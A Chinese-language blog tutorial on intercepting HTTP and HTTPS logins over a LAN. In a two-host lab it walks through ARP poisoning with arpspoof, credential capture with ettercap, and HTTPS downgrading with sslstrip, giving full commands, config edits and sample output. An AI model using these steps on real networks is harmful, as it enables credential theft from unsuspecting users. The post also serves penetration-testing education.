---
layout: post
title:  "网络安全-局域网https嗅探"
categories: 网络安全
tags: 网络安全 https嗅探
author: xueyp
description: 局域网https嗅探,arpspoof,sslstrip,ettercap
---

局域网http嗅探是一种典型的中间人攻击（man-in-the-middle)，攻击者扮演中间人进行攻击，可以劫持一段http/https会话，窃取凭证和其他机密信息。

# 搭建环境 

## 环境
- 主机1: 172.16.1.253 manjaro系统

需安装arpspoof,sslstrip,ettercap,其中arpspoof在dsniff包中。kali自带所有工具。

开启ip转发：

```
echo 1 >/proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward #若结果为1说明开启成功。
```

以上为临时开启，若想重启后还生效，需要配置：

```
/etc/sysctl.d/30-ipforward.conf

net.ipv4.ip_forward=1
```

- 主机2: 172.16.1.252 windows系统

## 所用软件

- arpspoof

arpspoof是一种用作ARP欺骗的一种中间人攻击工具，通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。

- sslstrip

在日常上网过程中，用户只是在地址栏中输入网站域名，而不添加协议类型，如HTTP和HTTPS。这时，浏览器会默认在域名之前添加http://，然后请求网站。如果网站采用HTTPS协议，就会发送一个302重定向状态码和一个HTTPS的跳转网址，让浏览器重新请求。浏览器收到后，会按照新的网址，进行访问，从而实现数据安全加密。由于存在一次不安全的HTTP的请求，所以整个过程存在安全漏洞。

sslstrip工具就是利用这个漏洞，实施攻击。渗透测试人员通过中间人攻击方式，将目标的数据转发到攻击机。sslstrip将跳转网址的HTTPS替换为HTTP，发给目标。目标以HTTP方式重新请求，而sslstrip将HTTP替换为HTTPS，请求对应的网站。这样就形成了，目标和ssltrip之间以HTTP明文方式传输，而sslstrip和服务器以HTTPS加密方式传输。这样，渗透人员就可以轻松获取明文数据了。

- ettercap

ettercap是一款现有流行的网络抓包软件，他利用计算机在局域网内进行通信的ARP协议的缺陷进行攻击，在目标与服务器之间充当中间人，嗅探两者之间的数据流量，从中窃取用户的数据资料。

ettercap有两种运行方式，UNIFIED和BRIDGED。UNIFIED的方式是以中间人方式嗅探，基本原理是同时欺骗主机A和B，将自己充当一个中间人的角色，数据在A和B之间传输时会通过C，C就可以对数据进行分析，从而完成嗅探。BRIDGED方式是在双网卡情况下，嗅探两块网卡之间的数据包。

ettercap的sniffing工作方式划分为五种：

1. IPBASED：在基于IP地址的sniffing方式下，ettercap将根据源IP-PORT和目的IP-PORT来捕获数据包；

2. MACBASED：在基于MAC地址的方式下，ettercap将根据源MAC和目的MAC来捕获数据包（在捕获通过网关的数据包时，该方式很有用）；

3. ARPBASED：在基于Arp欺骗的方式下，ettercap利用Arp欺骗在交换局域网内监听两个主机之间的通信（全双工）；

4. SMARTARP：在SMARTARP方式下，ettercap利用Arp欺骗，监听交换网上某台主机与所有已知的其他主机（存在于主机表中的主机）之间的通信（全双工）；

5. PUBLICARP：在PUBLICARP 方式下，ettercap利用Arp欺骗，监听交换网上某台主机与所有其它主机之间的通信（半双工）。此方式以广播方式发送Arp响应，但是如果 ettercap已经拥有了完整的主机地址表（或在ettercap启动时已经对LAN上的主机进行了扫描），ettercap会自动选取 SMARTARP方式，而且Arp响应会发送给被监听主机之外的所有主机，以避免在Windows主机上出现IP地址冲突的消息。

# 实施嗅探

- 在主机1开启欺骗

```
sudo arpspoof -i enp2s0 -t 172.16.1.252 172.16.1.254 #（-i：后面跟攻击机网卡   -t：后面跟受害机的ip和网关）
1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80

```

- 在主机1开启密码嗅探

新建一个终端，用ettercap命令截取对方输入的账号密码

```
sudo ettercap  -Tq  -i enp2s0 #（-T：启动文本模式  q：安静模式     -i：攻击机网卡）

ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team

Listening on:
enp2s0 -> 1C:6F:65:DE:D4:80
      172.16.1.253/255.255.255.0
      fe80::1e6f:65ff:fede:d480/64
      fda8:5929:4981:0:1e6f:65ff:fede:d480/64
      fda8:5929:4981::823/128

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  33 plugins
  42 protocol dissectors
  57 ports monitored
20388 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

57 hosts added to the hosts list...
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

DHCP: [00:22:AA:E7:BC:C0] DISCOVER 

```

- 在主机2用http协议访问网站并输入账号密码，就能截取到账号密码等一系列信息，需要注意的是，若用户名是中文汉字，截取下来的user类似于%E8%E6%86  这样的，需要手动URL解码。

# https嗅探 

https协议网站的账号密码获取方式与其相似，只不过中间加了一个步骤。

- 在主机1开启欺骗

```
sudo arpspoof -i enp2s0 -t 172.16.1.252 172.16.1.254
```

- 开启

vim  /etc/ettercap/etter.conf    去掉linux下的俩个注释,此处要注意的是，如果用的是ipchains，则去掉如下注释。

```
#---------------
#     Linux 
#---------------

# if you use ipchains:
   redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
   redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
```

若用的是iptables,刚去掉# if you use iptables:下两行的注释。

然后，运行sslstrip

```
sudo sslstrip   -a  -f  -k  
sslstrip 0.9 by Moxie Marlinspike running...
```
--------------------- 

- 在主机1开启密码嗅探

新建一个终端，用ettercap命令截取对方输入的账号密码

```
sudo ettercap  -Tq  -i enp2s0
```

然后在主机2访问https网站，即可截获密码。

参考
============

[Arpspoof工具](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html)

[SSLSTRIP in a Man in the Middle Attack](https://www.cybrary.it/0p3n/sslstrip-in-man-in-the-middle-attack/)

[Man In the Middle attacks with sslstrip and arpspoof](https://wmsmartt.wordpress.com/2011/08/30/man-in-the-middle-attacks-with-sslstrip-and-arpspoof/)

版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
